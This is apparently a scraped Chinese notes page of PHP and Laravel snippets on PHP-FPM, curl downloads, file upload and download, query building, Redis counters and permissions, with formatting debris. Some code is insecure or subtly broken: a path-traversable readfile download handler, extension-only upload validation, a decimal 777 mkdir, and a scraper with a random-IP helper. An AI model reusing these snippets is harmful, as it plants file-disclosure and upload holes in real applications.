PHP 解析器等 完成 PHP 执行获取结果PHP-FPM 是一种 master/worker 进程架构。首先会启动一个 master 主进程，主要功能用来完成 PHP 环境的初始化，事件监听，子进程状态管理等等。然后会启动若干 worker 子进程来处理 PHP 请求。master 进程的工作流程1. 初始化 CGI，注册进程信号初始化全局变量。2. 完成 PHP 环境初始化。加载 php.ini 解析配置文件，加载 PHP 模块记录函数符号表，加载 zend 扩展，设置禁用函数和类库设置，注册回收内存方法。3. 完成 PHP-FPM 初始化。加载并解析 php-fpm.conf 文件，获取进程相关参数，初始化进程池以及事件模型等。4. 处理子进程相关操作。fork 子进程，进行事件监听等。worker 进程工作流程1. 接收请求。这里是不需要初始化 PHP 运行环境的。2. 处理请求。获取请求内容注册全局变量 ($_GET,$_POST,$_SERVER 等)，然后根据请求信息访问对应的 PHP 文件，然后将 PHP 脚本文件交给 Zend 引擎处理。3. 处理结果。在 Zend 引擎处理完毕后将会进行回调，发送响应内容，释放内存等测试 php-fpm 配置内容是否正确 使用 -t 参数， 还可以通过加 -c 指定 php.ini 文件，通过 -y 指定 php-fpm.conf 文件 /usr/sbin/php-fpm7 -t/usr/sbin/php-fpm7 -c /usr/local/php/etc/php.ini -y /usr/local/php/etc/php-fpm.conf -t使用 root 权限启动子进程 通过增加 -R 参数/usr/sbin/php-fpm7 -c xxx/xxx/xxx/php.ini -y /xxx/xxx/xxx/php-fpm.conf -R重新创建容器 并添加 --cap-add=SYS_PTRACE 给容器追加 Ptrace 功能docker run --name website_name -p 11280:80 --cap-add=SYS_PTRACE -v /data/website/website_name:/app -d showtime/php-javabridge:v1 https://learnku.com/articles/28683 Elasticsearch/Algolia 全文搜索12345https://www.elastic.co/cn/downloads/elasticsearch新版的 ES 是内置的 java 环境windows 直接启动 elasticsearch.bat https://learnku.com/articles/30812#reply117421 PHP 系统调用time()123456789101112131415161718192021222324$year = date('Y', time());$month = date('m', time());系统调用就是操作系统提供给用户程序访问计算机资源的接口，更要命的是，系统调用极其耗时class TimeWrapper&#123; private static $now_time = 0; /** * @param bool $force_refresh 是否强制刷新 * @return int */ public static function getTime($force_refresh = false) &#123; if ($force_refresh) &#123; self::$now_time = time(); &#125; else &#123; if (!self::$now_time) &#123; self::$now_time = time(); &#125; &#125; return self::$now_time; &#125;&#125;https://learnku.com/articles/36538 curl 下载进度123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110class Downloader&#123; static $lastDownloaded = 0; static $lastTime = null; public static function download($url, $fileName, $date) &#123; ini_set('memory_limit', Config::$memory_limit); //调整最大占用内存 $code = ['"', '*', ':', '&lt;', '&gt;', '？', '/', '\\', '|']; $fileName = preg_replace('# #','',$fileName); $fileName = str_replace($code, '', $fileName); if (!is_dir(Config::$path)) &#123; mkdir(Config::$path); &#125; $filePath = Config::$path.'/'.date('Ymd',strtotime($date)).'_'.$fileName.'.mp4'; if (file_exists($filePath))&#123; echo "\033[0;32m"."文件已存在"."\033[0m\n"; return; &#125; $header = array(); $header[] = "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Name'"; $header[] = "Referer:http://91porn.com"; $ch = curl_init(); // 从配置文件中获取根路径 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_TIMEOUT,300); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $header); if (property_exists('Config', 'proxy')) &#123; curl_setopt($ch, CURLOPT_PROXY, Config::$proxy); &#125; // 开启进度条 curl_setopt($ch, CURLOPT_NOPROGRESS, false); // 进度条的触发函数 curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, array(new self, 'progress')); // ps: 如果目标网页跳转，也跟着跳转 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); $data = curl_exec($ch); curl_close($ch); if ($data) &#123; $file = fopen($filePath,"w+"); fputs($file,$data);//写入文件 fclose($file); &#125; // 使用rclone上传onedrive，其中“91porn:/91porn”对应网盘名称和路径 // $command = 'rclone move -P '.$filePath.' 91porn:/91porn'; // system($command); unset($data); &#125; /** * 进度条下载.https://github.com/zzjzz9266a/91porn_php * * @param $ch * @param $downloadSize 总下载量 * @param $downloaded 当前下载量 * @param $uploadSize * @param $uploaded */ function progress($resource, $downloadSize = 0, $downloaded = 0, $uploadSize = 0, $uploaded = 0)&#123; if ($downloadSize === 0) &#123; return; &#125; if ($downloaded == $downloadSize) &#123; printf("下载完成: %.1f%%, %.2f MB/%.2f MB\n", $downloaded/$downloadSize*100, $downloaded/1000000, $downloadSize/1000000); Downloader::$lastDownloaded = 0; Downloader::$lastTime = 0; return; &#125; if (microtime(true)-Downloader::$lastTime &lt;= 1) &#123; return; &#125; $speed = ($downloaded-Downloader::$lastDownloaded)/(microtime(true)-Downloader::$lastTime)/1000; Downloader::$lastDownloaded = $downloaded; Downloader::$lastTime = microtime(true); $downloaded = $downloaded/1000000; $downloadSize = $downloadSize/1000000; if ($speed &lt; 1000) &#123; $speedStr = ", 下载速度：%.2f kb/s "; &#125;else&#123; $speedStr = ", 下载速度：%.2f mb/s "; $speed = $speed/1000; &#125; $progress = $downloaded/$downloadSize*100; printf("下载进度: %.1f%%, %.2f MB/%.2f MB".$speedStr."\r", $progress, $downloaded, $downloadSize, $speed); &#125;&#125;function random_ip()&#123; $a = rand(0, 255); $b = rand(0, 255); $c = rand(0, 255); $d = rand(0, 255); return $a.'.'.$b.'.'.$c.'.'.$d;&#125; 队列执行频率限制123456789101112131415161718192021每分钟限制执行 10 次 JOB（注意是 JOB，而不是整个队列）use Illuminate\Support\Facades\Redis;Redis::throttle('key')-&gt;allow(10)-&gt;every(60)-&gt;then(function () &#123; // 任务逻辑...&#125;, function () &#123; // 无法获得锁... return $this-&gt;release(10);&#125;);并发，限制同一时间只执行一个 JOBRedis::funnel('key')-&gt;limit(1)-&gt;then(function () &#123; // 任务逻辑...&#125;, function () &#123; // 无法获得锁... return $this-&gt;release(10);&#125;);方法里的参数 key 是自定义的 redis key，如果需要多个 job 共用一个限制，则可以使用同一个 key https://learnku.com/articles/30054 上传文件和下载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106 /* 文件上传函数 @param string $name 文件上传文件域的name值 @param string $dir 文件保存路径 @param array $allow 文件允许上传的类型 return string $filename 文件名 如果失败 返回false */ function upload($name,$dir='./upload/',$allow=array('jpg','gif','jpeg','png'))&#123; //echo $name;exit; //var_dump($_FILES);exit; //1.判断文件上传错误 if($_FILES[$name]['error']&gt;0)&#123; //echo '上传错误'; switch($_FILES[$name]['error'])&#123; case 1: echo '上传的文件超过了 php.ini 中upload_max_filesize 选项限制的值.'; break; case 2: echo '上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'; break; case 3: echo '文件只有部分被上传.'; break; case 4: echo '没有文件被上传.'; break; case 6: echo '找不到临时文件夹.'; break; case 7: echo '文件写入失败.'; break; &#125; return false; &#125; //2.判断你文件上传的类型是否是你想要的类型 //2.1允许上传的类型 //2.2 获取后缀名 $suffix = pathinfo($_FILES[$name]['name'],PATHINFO_EXTENSION); //echo $suffix;exit; //2.3 判断是否是我们允许上传的类型 //var_dump(in_array($suffix,$allow));exit; if(!in_array($suffix,$allow))&#123; //不允许上传的类型 echo '大哥你的上传类型不符合'; return false; &#125; //3.起名字 $filename = date('Ymd').uniqid().mt_rand(0,9999).'.'.$suffix; //echo $filename;exit; //4.判断保存路径是否存在 //4.1 得到保存路径 //4.2 处理保存路径和后面的斜杠 $save_path = rtrim($dir,'/'); $save_path .='/'; //4.3 保存路径中的时间文件夹处理 $save_path .=date('Y/m/d/'); //4.4 判断保存的路径是否存在 if(!file_exists($save_path))&#123; mkdir($save_path,777,true); &#125; //4.5 拼接一个完整的保存路径 $path = $save_path.$filename; //echo $path;exit; //5.判断是否是httppost方式上传 if(!is_uploaded_file($_FILES[$name]['tmp_name']))&#123; echo '滚蛋！'; return false; &#125; //6.移动图片 if(!move_uploaded_file($_FILES[$name]['tmp_name'],$path))&#123; echo '移动失败'; return false; &#125; //7.返回移动成功的图片名 return $filename; &#125; 下载文件 &lt;!-- 浏览器认识这样的类型,就会被解析 --&gt; &lt;a href="./action.php?name=1.html"&gt;1.html&lt;/a&gt; &lt;a href="./action.php?name=1.php"&gt;1.php&lt;/a&gt; &lt;a href="./action.php?name=1.txt"&gt;1.txt&lt;/a&gt; &lt;a href="./action.php?name=1.jpg"&gt;1.jpg&lt;/a&gt; //接收一下name值. $name = $_GET['name']; //实现下载功能 //强制浏览器弹出另存为对话框 header('content-Disposition:attachment;filename="'.$name.'"'); //此时只是下载了一个空文件,需要利用readfile读一遍所有的内容.便可下载. $path = './downlist/'.$name; readfile($path);https://learnku.com/articles/36744 app 接口对接1234567891011if (empty($arr)) &#123; $arr = (object) null;//$arr = new stdClass;&#125;echo json_encode($arr);$arr = ["id"=&gt;"1","name"=&gt;null];$data = [ "id"=&gt;(int) $arr["id"],"name"=&gt;(string) $arr["name"],];echo json_encode($data);json_encode ($result ,JSON_FORCE_OBJECT)，返回格式为 &#123;&#125;, 异常类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function doSomething()&#123; if(something error)&#123; throw new SomethingException('something error'); &#125; ... do something&#125;//调用try&#123; doSomething();&#125;catch(SomethingException $e)&#123; echo "something goes error";&#125;// 调用方无法从外部得知时哪里出了问题，因为只返回了 falsefunction checkoutOrder($orderNumber)&#123; $orderModel = OrderModel::query()-&gt;where('order_number',$orderNumber)-&gt;first(); if(!$orderModel)&#123; return false; &#125; $payResut = PayService::pay($orderModel); if(!$payResut)&#123; return false; &#125;&#125;function checkoutOrder($orderNumber)&#123; $orderModel = OrderModel::query()-&gt;where('order_number',$orderNumber)-&gt;first(); if(!$orderModel)&#123; throw new OrderNotFoundException($orderNumber); &#125; $payResut = PayService::pay($orderModel); if(!$payResut)&#123; throw new PaymentException(); // 这个异常应该上面的 PayService 中抛出，为了更清晰就写在这 &#125;&#125;// 调用try&#123; checkoutOrder('ORDER00001');&#125;catch(OrderNotFoundException $e)&#123; return response('订单不存在：'.$e-&gt;getMessage(),404);&#125;catch(PaymentException $e)&#123; return response('支付失败：'.$e-&gt;getMessage(),500);&#125;app/Exceptions/Handler.php 中根据异常名、紧急程度调用第三方通知工具（钉钉、邮件等）通知项目错误。public function report(Exception $exception)&#123; if ($this-&gt;shouldntReport($exception)) &#123; return; &#125; // 如果异常类中存在 report 方法，就使用自身的 if (method_exists($exception, 'report')) &#123; return $exception-&gt;report(); &#125; $msg = "系统异常：" . $exception-&gt;getMessage(); $msg .= "\n文件：" . $exception-&gt;getFile(); $msg .= "\n行号：" . $exception-&gt;getLine(); $msg .= "\n参数:" . json_encode(['form_params' =&gt; request()-&gt;all()]); DingService::sendWarning($msg); parent::report($exception);&#125;在 render 方法根据异常名返回不同的客户端响应：public function render($request, Exception $exception)&#123; if ($exception instanceof OrderException) &#123; return $this-&gt;handleOrderException($exception, $request); &#125; if ($exception instanceof PaymentException) &#123; return $this-&gt;handlePaymentException($exception, $request); &#125; return parent::render($request, $exception);&#125;https://learnku.com/articles/36657 where or 查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677 SELECT * FROM user WHERE group_id = 'group id' AND ( name = 'name' OR mobile_number = 'mobile number' OR email = 'email' OR `score` &gt; 1000 ) DB::table('users') -&gt;where('group_id', 'group id') -&gt;where(function ($query) &#123; $query-&gt;where('name', 'name') -&gt;orWhere('mobile_number', '=', 'mobile number') -&gt;orWhere('email', '=', 'email') -&gt;orWhere('score', '&gt;', '1000'); &#125;) -&gt;get();DB::table('users') -&gt;where('group_id', 'group id') -&gt;where(function ($query) &#123; if ($params['name']) &#123; $query-&gt;orWhere('name', $params['name']) &#125; if ($params['mobile_number']) &#123; $query-&gt;orWhere('mobile_number', $params['mobile_number']) &#125; if ($params['email']) &#123; $query-&gt;orWhere('email', $params['email']) &#125; if ($params['score']) &#123; $query-&gt;orWhere('score', '&gt;', $params['score']) &#125; &#125;) -&gt;get(); $orWhere = []; if ($params['name']) &#123; $orWhere[] = ['name', '=', $params['name'], 'OR']; &#125; if ($params['mobile_number']) &#123; $orWhere[] = ['mobile_number', '=', $params['mobile_number'], 'OR']; &#125; if ($params['email']) &#123; $orWhere[] = ['email', '=', $params['email'], 'OR']; &#125; if ($params['score']) &#123; $orWhere[] = ['score', '&gt;', $params['score'], 'OR']; &#125; DB::table('users') -&gt;where('group_id', 'group id') -&gt;where($orWhere) -&gt;get(); $orWhere = []; if ($params['name']) &#123; $orWhere['name'] = $params['name']; &#125; if ($params['mobile_number']) &#123; $orWhere['mobile_number'] = $params['mobile_number']; &#125; if ($params['email']) &#123; $orWhere['email'] = $params['email']; &#125; if ($params['score']) &#123; $orWhere[] = ['score', '&gt;', 1000, 'OR']; &#125; DB::table('users') -&gt;where('group_id', 'group id') -&gt;where(function ($query) use ($orWhere) &#123; $query-&gt;orWhere($orWhere); &#125;) -&gt;get(); https://learnku.com/articles/36743 查询封装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364select * from posts where title='xxx' and content='xxxx';use Illuminate\Http\Request;use Illuminate\Database\Query\Builder;abstract class QueryFilter&#123; protected $request; protected $builder; public function __construct(Request $request) &#123; $this-&gt;request = $request; &#125; public function apply(Builder $builder) &#123; $this-&gt;builder = $builder; $this-&gt;init(); foreach ($this-&gt;filters() as $name =&gt; $value) &#123; if($value)&#123; if (method_exists($this, $name)) &#123; call_user_func_array([$this, $name],[$value]); &#125; &#125; &#125; return $this-&gt;builder; &#125; protected function init() &#123; //子类可以做一些初始化的查询 &#125; public function filters() &#123; return $this-&gt;request-&gt;all(); &#125;&#125;namespace App\Services\Search\Db\Filter;class PostFilter extends QueryFilter&#123; public function title($title) &#123; return $this-&gt;builder-&gt;where('title', 'like', "%&#123;$title&#125;%"); &#125; public function content($content) &#123; return $this-&gt;builder-&gt;where('content','like', "%&#123;$content&#125;%"); &#125;&#125;use DB;DB::table('posts')-&gt;where(function($query)&#123; app(\App\Services\Search\Db\Filter\PostFilter::class)-&gt;apply($query);&#125;)-&gt;get();https://learnku.com/articles/36716 redis同步到数据库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131namespace App\Models\Traits;use Redis;use Carbon\Carbon;trait ViewCountsHelper &#123; // 缓存相关 protected $hash_prefix = 'topic_view_counts_'; protected $field_prefix = 'topic_'; public function viewCountIncrement() &#123; // 获取今日 Redis 哈希表名称，如：topic_view_counts_2017-10-21 $hash = $this-&gt;getHashFromDateString(Carbon::now()-&gt;toDateString()); // 字段名称，如：topic_1 $field = $this-&gt;getHashField(); // 当前阅读数，如果存在就自增，否则就为 1 $count = Redis::hGet($hash, $field); if ($count) &#123; $count++; &#125; else &#123; $count = 1; &#125; // 数据写入 Redis ，字段已存在会被更新 Redis::hSet($hash, $field, $count); &#125; public function syncTopicViewCounts() &#123; // 获取昨日的哈希表名称，如：topic_view_counts_2017-10-21 $hash = $this-&gt;getHashFromDateString(Carbon::now()-&gt;toDateString()); // 从 Redis 中获取所有哈希表里的数据 $counts = Redis::hGetAll($hash); // 如果没有任何数据直接 return if (count($counts) === 0) &#123; return; &#125; // 遍历，并同步到数据库中 foreach ($counts as $topic_id =&gt; $view_count) &#123; // 会将 `topic_1` 转换为 1 $topic_id = str_replace($this-&gt;field_prefix, '', $topic_id); // 只有当话题存在时才更新到数据库中 if ($topic = $this-&gt;find($topic_id)) &#123; $topic-&gt;view_count = $this-&gt;attribute['view_count'] + $view_count; $topic-&gt;save(); &#125; &#125; // 以数据库为中心的存储，既已同步，即可删除 Redis::del($hash); &#125; public function getViewCountAttribute($value) &#123; // 获取今日对应的哈希表名称 $hash = $this-&gt;getHashFromDateString(Carbon::now()-&gt;toDateString()); // 字段名称，如：topic_1 $field = $this-&gt;getHashField(); // 三元运算符，优先选择 Redis 的数据，否则使用数据库中 $count = Redis::hGet($hash, $field) ? : $value; // 如果存在的话，返回 数据库中的阅读数 加上 Redis 中的阅读数 if ($count) &#123; return $this-&gt;attribute['view_count'] + $count; &#125; else &#123; // 否则返回 0 return 0; &#125; &#125; public function getHashFromDateString($date) &#123; // Redis 哈希表的命名，如：topic_view_counts_2017-10-21 return $this-&gt;hash_prefix . $date; &#125; public function getHashField() &#123; // 字段名称，如：topic_1 return $this-&gt;field_prefix . $this-&gt;id; &#125;&#125;在需要此功能的模型中 use Traits\ViewCountsHelper 即可namespace App\Console\Commands;use Illuminate\Console\Command;use App\Models\Topic;class SyncTopicViewCounts extends Command&#123; protected $signature = 'topic:sync-topic-view-counts'; protected $description = '将话题 view_count 从 Redis 同步到数据库中'; /** * Execute the console command. * * @return mixed */ public function handle(Topic $topic) &#123; $topic-&gt;syncTopicViewCounts(); $this-&gt;info("同步成功！"); &#125;&#125;namespace App\Http\Controllers;use App\Models\Topic;use Illuminate\Http\Request;class TopicsController extends Controller&#123; public function show(Topic $topic) &#123; $topic-&gt;viewCountIncrement(); // 自增浏览数 dd($topic-&gt;view_count); // 获取浏览数 &#125;&#125;https://learnku.com/articles/32615 where in123456789101112131415161718192021$where['status'] = 1;$ids = [1,2];$where[] = [function($query) use ($ids)&#123; $query-&gt;whereIn('id', $ids);&#125;];$list = User::where($where) -&gt;get();生成 sql 如下select * from `users` where (`status` = 1 and (`id` in (1, 2)))$status = 1;$ids = [1,2];User::when($status, function ($query, $status) &#123; return $query-&gt;where('status', $status); &#125;) -&gt;when($ids, function ($query, $ids) &#123; return $query-&gt;whereIn('id', $ids); &#125;) -&gt;get();https://learnku.com/articles/36964 付费文章试读1234567891011121314151617181920对 HTML 进行截断：closetags(str_limit($article-&gt;body, 1000))闭合标签：function closetags($html) &#123; libxml_use_internal_errors(true); $dom = new \DOMDocument; $dom-&gt;loadHTML('&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;' . $html); // Strip wrapping &lt;html&gt; and &lt;body&gt; tags $mock = new \DOMDocument; $body = $dom-&gt;getElementsByTagName('body')-&gt;item(0); foreach ($body-&gt;childNodes as $child) &#123; $mock-&gt;appendChild($mock-&gt;importNode($child, true)); &#125; return trim($mock-&gt;saveHTML());&#125;https://learnku.com/laravel/t/36859 全局记录管理员的所有操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061namespace App\Providers;use App\Models\AdminLog;use Illuminate\Support\Facades\Auth;use Illuminate\Support\Facades\Event;use Illuminate\Support\ServiceProvider;class LogServiceProvider extends ServiceProvider&#123; /** * Register services. *https://gist.github.com/Hanson/b8916bf13c38336f8eb33e537fab3723 * @return void */ public function boot() &#123; Event::listen('eloquent.*', function ($eventName, $data) &#123; if (preg_match('/eloquent\.(.+):\s(.+)/', $eventName, $match) === 0) &#123; return; &#125; /** $match @val array array ( 0 =&gt; 'eloquent.booting: App\\Models\\Groupon', 1 =&gt; 'booting', 2 =&gt; 'App\\Models\\Groupon', ) */ // only record when 'created', 'updated', 'deleted' if (!in_array($match[1], ['created', 'updated', 'deleted'])) &#123; return; &#125; // only record the admin operation. if (!Auth::guard('admin')-&gt;check()) &#123; return; &#125; $model = $data[0]; $class = get_class($model); $diff = array_diff_assoc($model-&gt;getOriginal(), $model-&gt;getAttributes()); $keys = array_keys($diff); $data = []; foreach ($keys as $key) &#123; if ($key === 'updated_at') &#123; continue; &#125; $data[$key] = [ 'old' =&gt; $model-&gt;getOriginal($key), 'new' =&gt; $model-&gt;getAttributes()[$key] ]; &#125; $admin = Auth::guard('admin')-&gt;user(); // You can create the table with your situation AdminLog::query()-&gt;create([ 'admin_id' =&gt; $admin-&gt;id, 'url' =&gt; request()-&gt;fullUrl(), 'action' =&gt; $match[1], // updated created deleted 'ip' =&gt; request()-&gt;getClientIp(), 'model_id' =&gt; $model-&gt;id, 'model_type' =&gt; $class, 'data' =&gt; $data, 'created_at' =&gt; now(), ]); &#125;); &#125; Column not found: 1054 Unknown column1234567891011$res = Model::where('date',date('Ymd'))-&gt;whereraw('(a=1 or b=2)')$date=date('Ymd');$res = Model::where('date',$date)-&gt;whereraw('(a=1 or b=2)')提示Column not found: 1054 Unknown column$res=Model::where('date',$date)-&gt;where(function ($query) use($date)&#123; $query-&gt;where('a', '&gt;', $date)-&gt;orwhere('b', '2'); &#125;) groupBy 分组查询的分页1234567891011use Illuminate\Pagination\LengthAwarePaginator;use Illuminate\Support\Facades\DB;use App\Models\UserHasCard;...$page = 1;//当前页$pageSize = 10;$model = UserHasCard::groupBy('user_id');$count = DB::table($model)-&gt;count();$data = $model-&gt;limit($pageSize)-&gt;offset(($page-1)*$pageSize)-&gt;get();$list = new LengthAwarePaginator($data,$count,$pageSize,$page);https://learnku.com/articles/37239 php artisan tinker编码123456789&gt;&gt;&gt; \App\Ip::where('zt', '未付')-&gt; get();Illuminate\Database\QueryException with message 'SQLSTATE[HY000]: General error: 1267 Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8_unicode_ci,COERCIBLE) for operation '=' (SQL: select * from `ip` where `zt` = 未付)'\App\Ip::query('select convert(zt USING gbk) from ip where zt = "未付"')-&gt;limit(2)-&gt;get()&gt;&gt;&gt; \App\Ip::query('select convert(zt USING gbk) where zt = 未付')-&gt;limit(2)-&gt;get()select convert(zt USING gbk) from `ip` where zt = "未付"https://learnku.com/laravel/t/37299 api文档l5-swagger1234567891011121314151617181920212223242526272829303132composer require darkaonline/l5-swaggerphp artisan vendor:publish --provider "L5Swagger\L5SwaggerServiceProvider"http://122.51.155.172:8000/api/documentationvi app/Http/Controllers/MyController.php&lt;?php/** * @OA\Info(title="Test", version="0.0.1") */// 别直接复制这里的注释，缩进破坏了，// 请上 github 上复制它的用例。这里只作为演示作用class MyController&#123;/** * @OA\Get( * path="/api/syahi", * @OA\Response(response="200", description="An example resource") * ) */ public function say() &#123; return ['msg' =&gt; 'Hello World']; &#125; // Other Code...&#125;php artisan l5-swagger:generate它会生成 API 文档，默认在项目根目录： storage\api-docs\api-docs.jsonhttps://learnku.com/articles/37313#reply119615 Laravel 里面的 chunk 分块效率1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859 public function chunkTest() &#123; // 每次处理 $speed = 1000; // 进度条 $bar = $this-&gt;output-&gt;createProgressBar(TestModel::query()-&gt;count()); // 记录开始时间 $timeStart = $this-&gt;microtime_float(); // chunk 分块处理数据 TestModel::query()-&gt;chunk($speed, function ($item) use ($bar, $speed) &#123; // 业务处理逻辑... // .... // 进度条步进&#123;$speed&#125;步\ $bar-&gt;advance($speed); &#125;); $bar-&gt;finish(); // 处理完成，记录结束时间 $timeEnd = $this-&gt;microtime_float(); $time = $timeEnd - $timeStart; // 输出信息 $this-&gt;info('chunk用时:'. $time); &#125;public function idTest()&#123; // 进度条 $bar = $this-&gt;output-&gt;createProgressBar(TestModel::query()-&gt;count()); $timeStart = $this-&gt;microtime_float(); // 记录最大的id $maxId = 0; // 每次处理多少条数据 $speed = 1000; while (true) &#123; $models = TestModel::query() // 每次循环加上id条件 -&gt;where('id', '&gt;', $maxId) -&gt;limit($speed) -&gt;orderBy('id') -&gt;get(); // 处理具体业务逻辑... // 如果没有数据就代表处理完成，break； if ($models-&gt;isEmpty()) &#123; break; &#125; // 记录下本次的最大id，下次循环时当作条件 $maxId = $models-&gt;max(['id']); $bar-&gt;advance($speed); &#125; $timeEnd = $this-&gt;microtime_float(); $time = $timeEnd - $timeStart; $bar-&gt;finish(); $this-&gt;info('id条件用时: '. $time);&#125;https://learnku.com/articles/37541 Facade demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657php artisan make:provider MyServiceProvidernamespace App\Providers;use B;use Illuminate\Support\ServiceProvider;class TestProvider extends ServiceProvider&#123; /** * Register services. * * [[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554) void */ public function register() &#123; $this-&gt;app-&gt;singleton('my-facade',function()&#123; return new B(); &#125;); &#125; /** * Bootstrap services. * * [[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554) void */ public function boot() &#123; // &#125;&#125;B.phpclass B&#123; public function b()&#123; echo 'this class B function a ,you are right~!'; &#125;&#125;在 app.php 中 分别加入'providers'=&gt;[ ...... App\Providers\MyServiceProvider::class,]'aliases' =&gt; [ ...... 'MyFacade'=&gt;\App\Providers\Facades\MyProvider::class,]在 app/Providers 文件夹下创建 Facades 文件夹 并创建 MyFacade.php 文件namespace App\Providers\Facades;use Illuminate\Support\Facades\Facade;class MyFacade extends Facade&#123; public static function getFacadeAccessor() &#123; return 'my-facade'; &#125;&#125;\MyFacade::b();https://learnku.com/articles/36610 验证码（Captcha）包乱码12345678910https://github.com/Gregwar/Captchause Gregwar\Captcha\CaptchaBuilder;$code = new CaptchaBuilder;$code-&gt;build(102, 35);header('Content-type: image/jpeg');$code-&gt;output();我是在laravel中使用，会出现乱码。但是调用CaptchaBuilder::save()正常生成图片。群里的朋友说，可以在最有加一个exit();我试了一下，能行。 应该是在laravel的控制器中执行完毕会有内容输出，影响到了验证码的正常输出。但是加exit()总不是办法，会影响到session然后换成ob_end_clean()放在最前面，也能行。 我有一篇博客说过，ob_end_clean()和ob_clean()然后换成ob_clean()放在最前面试了一下，不行。 所以猜测，laravel在控制器结束后，会往缓冲区写点东西。而ob_clean()只清空缓冲区，并没有关闭。 所以无法正常输出！http://www.shiguopeng.cn/archives/24 laravel权限设计12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061用户表 角色表 用户角色表 权限表 权限角色表class User extends Authenticatable&#123; use Notifiable; /** * The attributes that should be hidden for arrays. * * @var array */ protected $hidden = [ 'password', 'remember_token', ]; // 用户和角色的模型关联关系 public function roles() &#123; return $this-&gt;belongsToMany(Role::class); &#125; /**************************************** * 封装一个方法方便使用 * 1. 需要的权限 * 2. 遍历当期那用户拥有的所有角色 * 3. 再通过角色判断是否有当前需要的权限 ****************************************/ public function hasPermission($permissionName) &#123; foreach ($this-&gt;roles as $role) &#123; if ($role-&gt;permisssions()-&gt;where('name', $permissionName)-&gt;exists()) &#123; return true;; &#125; &#125; return false; &#125;&#125;class Role extends Model&#123; // 用户和角色的模型关联关系 public function users() &#123; return $this-&gt;belongsToMany(User::class); &#125; // 角色和权限的模型关联关系 public function permissions() &#123; return $this-&gt;belongsToMany(Permission::class); &#125;&#125;class Permission extends Model&#123; // 角色和权限的模型关联关系 public function roles() &#123; return $this-&gt;belongsToMany(Role::class); &#125;&#125;http://www.shiguopeng.cn/archives/260 https://github.com/spatie/laravel-permission 路由多版本拆分12345678910111213141516171819202122232425262728293031 /** * 路由加载 多版本 */ protected function mapAppRoutes()&#123; // 获取路由文件夹下的所有目录和文件 foreach (scandir(base_path('routes')) as $dir)&#123; //匹配所有以v开头的目录作为版本号 if(starts_with($dir,'v'))&#123; //匹配目录下的php文件 foreach (glob(base_path('routes/'.$dir) . '/*.php') as $file) &#123; //前缀 目录版本号/文件名 Route::prefix($dir.'/'.basename($file,'.php')) -&gt;middleware('api') //设置命名空间 -&gt;namespace($this-&gt;namespace.'\\'.ucfirst(basename($file,'.php'))) -&gt;group($file); &#125; &#125; &#125; &#125;路由目录文件如下https://learnku.com/articles/37684├── routes│ └── v1│ ├── a.php│ ├── b.php│ └── v2│ ├── c.php lua 脚本 运行 Redis 命令123456789101112131415161718192021222324252627282930313233343536373839class IncrementExistingKeysBy extends ScriptCommand&#123; public function getKeysCount() &#123; // Tell Predis to use all the arguments but the last one as arguments // for KEYS. The last one will be used to populate ARGV.\ return -1; &#125; public function getScript() &#123; return &lt;&lt;&lt;LUA local cmd, insert = redis.call, table.insert local increment, results = ARGV[1], &#123; &#125; for idx, key in ipairs(KEYS) if cmd('exists', key) == 1 then insert(results, idx, cmd('incrby', key, increment)) else insert(results, idx, false) end end return results LUA; &#125;&#125;调用方式$client = new Predis\Client($single_server, array( 'profile' =&gt; function ($options) &#123; $profile = $options-&gt;getDefault('profile'); $profile-&gt;defineCommand('increxby', 'IncrementExistingKeysBy'); return $profile; &#125;,));$client-&gt;mset('foo', 10, 'foobar', 100);var_export($client-&gt;increxby('foo', 'foofoo', 'foobar', 50));https://learnku.com/articles/37661 Laravel 使用 Markdown 做文章编辑后台123456789101112131415161718192021222324252627282930313233343536373839composer require chenhua/laravel5-markdown-editorphp artisan vendor:publish --tag=markdown修改 config/markdowneditor.php 配置文件&lt;?phpreturn [ "default" =&gt; 'local', //默认返回存储位置url.也可以设置七牛上传路径,阿里云存储文件等等 "dirver" =&gt; ['local'], //存储平台 ['local', 'qiniu', 'aliyun'] "connections" =&gt; [ "local" =&gt; [ 'prefix' =&gt; 'uploads/markdown', //本地存储位置，默认uploads ], "qiniu" =&gt; [ 'access_key' =&gt; '', 'secret_key' =&gt; '', 'bucket' =&gt; '', 'prefix' =&gt; '', //文件前缀 file/of/path 'domain' =&gt; '' //七牛自定义域名 ], "aliyun" =&gt; [ 'ak_id' =&gt; '', 'ak_secret' =&gt; '', 'end_point' =&gt; '', 'bucket' =&gt; '', 'prefix' =&gt; '', ], ],]; //主页显示 public function index(Request $request) &#123; return view('index'); &#125; //提交 public function add(Request $request) &#123; $content = $request-&gt;input('test-editormd-html-code'); $article=Article::create($content); &#125; https://learnku.com/articles/30858 Laravel 的测试与 PHP Unit1234567891011121314151617181920212223242526// /tests/Feature/ExampleTest.php&lt;?phpnamespace Tests\Feature;use 